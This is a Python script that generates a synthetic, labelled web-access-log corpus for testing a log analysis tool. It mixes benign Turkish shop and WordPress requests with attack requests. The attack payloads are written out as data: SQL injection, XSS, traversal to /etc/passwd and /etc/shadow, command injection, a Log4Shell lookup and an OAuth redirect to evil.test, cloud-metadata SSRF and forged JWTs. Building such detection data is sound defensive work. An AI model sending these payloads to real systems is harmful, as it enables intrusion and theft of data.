#!/usr/bin/env python3
"""Musteri log_guardian formati — anonymized hosting (WP + TR e-ticaret + POST body)."""
from __future__ import annotations

import json
import os
import random
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / "corpus" / "customer_anonymized.access"
MANIFEST = ROOT / "corpus" / "customer_anonymized_manifest.json"
TARGET_LINES = int(os.environ.get("CUSTOMER_CORPUS_LINES", "800"))
TS = "09/Jun/2026:09:15:00 +0300"
RNG = random.Random(20260609)

# RFC 5737 — gercek musteri IP'si yok
IP_POOL = [f"203.0.113.{i}" for i in range(10, 250)]


def line_lg(
    ip: str,
    method: str,
    path: str,
    *,
    body: str = "-",
    status: int = 200,
    bytes_: int = 512,
    referer: str = "-",
    ua: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    xff: str = "-",
) -> str:
    b = body.replace("\\", "\\\\").replace('"', '\\"')
    return (
        f'{ip} - - [{TS}] "{method} {path} HTTP/1.1" {status} {bytes_} '
        f'"{referer}" "{ua}" "{xff}" "{b}"'
    )


def main() -> None:
    entries: list[dict[str, str]] = []

    def add(cat: str, raw: str) -> None:
        entries.append({"category": cat, "line": raw})

    def ip() -> str:
        return RNG.choice(IP_POOL)

    ua_browser = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    ua_wp = "WordPress/6.5; https://blog.example.com"
    ua_api = "MyApp/2.1 (+https://api.example.com)"
    benign_specs: list[tuple] = [
        ("GET", "/", 200, "-", "https://www.google.com/", ua_browser),
        ("GET", "/magaza", 200),
        ("GET", "/magaza/urun/laptop-asus-15", 200, "-", "https://shop.example.com.tr/magaza"),
        ("GET", "/kategori/telefon", 200),
        ("GET", "/sepet", 200),
        ("GET", "/odeme", 200),
        ("GET", "/hakkimizda", 200),
        ("GET", "/iletisim", 200),
        ("GET", "/wp-login.php", 200, "-", "-", ua_wp),
        ("GET", "/wp-admin/admin-ajax.php?action=heartbeat", 200, "-", "-", ua_wp),
        ("GET", "/wp-json/wp/v2/posts?per_page=10", 200, "-", "-", ua_wp),
        ("GET", "/wp-content/themes/twentytwentyfour/style.css", 200, "-", "-", ua_wp),
        ("GET", "/xmlrpc.php", 405),
        ("GET", "/favicon.ico", 200),
        ("GET", "/robots.txt", 200),
        ("GET", "/api/v1/urunler?limit=20", 200, "-", "-", ua_api),
        ("GET", "/api/health", 200, "-", "-", "kube-probe/1.0"),
        ("POST", "/wp-admin/admin-ajax.php", 200, "action=heartbeat&data=%5B%5D", "-", ua_wp),
        ("POST", "/api/v1/auth/login", 401, "email=user@example.com&password=***", "-", ua_api),
        ("GET", "/arama?kelime=telefon", 200, "-", "https://shop.example.com.tr/"),
    ]
    for spec in benign_specs:
        method, path, status = spec[0], spec[1], spec[2]
        body = spec[3] if len(spec) > 3 else "-"
        referer = spec[4] if len(spec) > 4 else "-"
        ua = spec[5] if len(spec) > 5 else ua_browser
        add("benign", line_lg(ip(), method, path, body=body, status=status, referer=referer, ua=ua))

    attack_specs = [
        ("sqli", "GET", "/arama?kelime=1%27+OR+%271%27%3D%271", 403),
        ("sqli", "GET", "/urun?id=1;DROP+TABLE+siparis--", 403),
        ("sqli", "GET", "/api/ara?q=admin%27--", 403),
        ("sqli", "POST", "/giris", 401, "kullanici=admin' OR '1'='1&parola=x"),
        ("sqli", "POST", "/api/kayit", 400, "email=a@b.com&pass=1'; DROP TABLE users--"),
        ("sqli", "POST", "/odeme", 403, "kart=4111&cvv=123&tutar=1 UNION SELECT null--"),
        ("xss", "GET", "/yorum?metin=%3Cscript%3Ealert(1)%3C/script%3E", 403),
        ("xss", "GET", "/haber?baslik=%3Cimg+src=x+onerror=alert(1)%3E", 403),
        ("lfi", "GET", "/indir?dosya=../../../etc/passwd", 403),
        ("lfi", "GET", "/resim?yol=..%2f..%2fetc%2fpasswd", 403),
        ("rce", "GET", "/cgi-bin/test?cmd=;cat+/etc/passwd", 403),
        ("scanner", "GET", "/wp-admin/setup-config.php", 404, "-", "Nikto/2.5.0"),
        ("scanner", "GET", "/.env", 404, "-", "curl/8.5.0"),
        ("scanner", "GET", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", 404, "-", "WPScan/3.8.22"),
        ("brute", "POST", "/wp-login.php", 401, "log=admin&pwd=wrong123&wp-submit=Log+In"),
        ("brute", "POST", "/giris", 401, "kullanici=admin&parola=123456"),
        ("brute", "POST", "/cpanel/login", 401, "user=root&pass=admin"),
        ("log4shell", "GET", "/api?q=${jndi:ldap://evil.test/a}", 403),
        ("nosql", "GET", "/api/kullanici?filter[$gt]=", 403),
        ("ssrf", "GET", "/proxy?url=http://169.254.169.254/latest/meta-data/", 403),
        ("jwt_abuse", "GET", "/api/me?token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.", 403),
        ("jwt_abuse", "GET", "/api/v2/hesap?bearer=eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.", 403),
        ("jwt_alg_confusion", "GET", "/auth?jwt=eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.", 403),
        ("jwt_alg_confusion", "GET", "/oauth/callback?token=eyJhbGciOiJIUzI1NiJ9.none.sig", 403),
        ("api_bola", "GET", "/api/v1/siparis/99?musteri_id=1", 403),
        ("api_abuse", "GET", "/api/v1/kullanici/2/profil?as_user=1", 403),
        ("api_abuse", "POST", "/api/v1/admin/rol", 403, "user_id=2&role=admin"),
        ("oauth_abuse", "GET", "/oauth/authorize?redirect_uri=https://evil.test/callback", 403),
        ("oauth_abuse", "GET", "/oauth/token?grant_type=client_credentials&client_id=x", 403),
        ("path_traversal_variant", "GET", "/indir?dosya=%2e%2e%2f%2e%2e%2fetc%2fpasswd", 403),
        ("path_traversal_variant", "GET", "/dosya?yol=..%252f..%252fetc%252fpasswd", 403),
        ("path_traversal_variant", "GET", "/export?path=....//....//etc/shadow", 403),
    ]
    for spec in attack_specs:
        cat = spec[0]
        method = spec[1]
        path = spec[2]
        status = spec[3]
        body = spec[4] if len(spec) > 4 else "-"
        ua = spec[5] if len(spec) > 5 else ua_browser
        add(cat, line_lg(ip(), method, path, body=body, status=status, ua=ua))

  # 2026 tehditleri: api_abuse, jwt_alg, path_traversal fill dongusunde dengeli
    fill_specs = [
        ("benign", "GET", "/magaza/sayfa/{}", 200, "-"),
        ("benign", "GET", "/blog/yazi/{}", 200, "-"),
        ("sqli", "GET", "/siparis?no={}%27", 403, "-"),
        ("xss", "GET", "/profil?ad=<script>alert({})</script>", 403, "-"),
        ("lfi", "GET", "/dosya?f=....//....//etc/passwd%00", 403, "-"),
        ("path_traversal_variant", "GET", "/static?file=%2e%2e%2fetc%2fpasswd%2f{}", 403, "-"),
        ("jwt_abuse", "GET", "/api/oturum?token=eyJhbGciOiJub25lIn0.evil{}", 403, "-"),
        ("jwt_alg_confusion", "GET", "/auth?jwt=eyJhbGciOiJub25lIn0.eyJhZG1pbiI6e30.{}", 403, "-"),
        ("api_abuse", "GET", "/api/v1/admin/users/{}?elevate=1", 403, "-"),
        ("oauth_abuse", "GET", "/oauth/authorize?redirect_uri=https://evil.test/{}", 403, "-"),
        ("api_bola", "GET", "/api/v1/fatura/{}?hesap=other", 403, "-"),
        ("scanner", "GET", "/wp-includes/wlwmanifest.xml", 404, "WPScan/3.8.22"),
        ("brute", "POST", "/giris", 401, "kullanici=user{}&parola=fail"),
        ("log4shell", "GET", "/api?q=${{jndi:ldap://x{}/a}}", 403, "-"),
        ("nosql", "GET", "/api/kullanici?filter[$ne]=null{}", 403, "-"),
        ("rce", "GET", "/cgi-bin/exec?cmd=;id%20{}", 403, "-"),
        ("ssrf", "GET", "/proxy?url=http://169.254.169.254/meta{}", 403, "-"),
    ]
    n = 0
    while len(entries) < TARGET_LINES:
        cat, method, tpl, status, body_tpl = fill_specs[n % len(fill_specs)]
        path = tpl.format(n)
        body = body_tpl.format(n) if "{}" in body_tpl else body_tpl
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        if cat == "scanner":
            ua = "Nikto/2.5.0"
        xff = RNG.choice(["-", "-", "-", "198.18.0." + str(n % 200)])
        add(cat, line_lg(ip(), method, path, body=body, status=status, ua=ua, xff=xff))
        n += 1

    RNG.shuffle(entries)

    OUT.parent.mkdir(parents=True, exist_ok=True)
    OUT.write_text("\n".join(e["line"] for e in entries) + "\n", encoding="utf-8")

    categories: dict[str, list[int]] = {}
    for idx, e in enumerate(entries):
        categories.setdefault(e["category"], []).append(idx)

    manifest = {
        "generated": TS,
        "format": "log_guardian",
        "source": "Anonymized TR/WP hosting replay — RFC5737 IPs, xff+request_body alanlari",
        "corpus": str(OUT.relative_to(ROOT)),
        "lines_total": len(entries),
        "categories": {
            cat: {"count": len(idxs), "line_indices": idxs}
            for cat, idxs in sorted(categories.items())
        },
    }
    MANIFEST.write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")
    attack_cats = {k: v for k, v in categories.items() if k != "benign"}
    print(
        f"[generate_customer_corpus] {OUT} ({len(entries)} lines, "
        f"log_guardian format, {len(attack_cats)} attack categories)"
    )
    print(f"[generate_customer_corpus] {MANIFEST}")


if __name__ == "__main__":
    main()
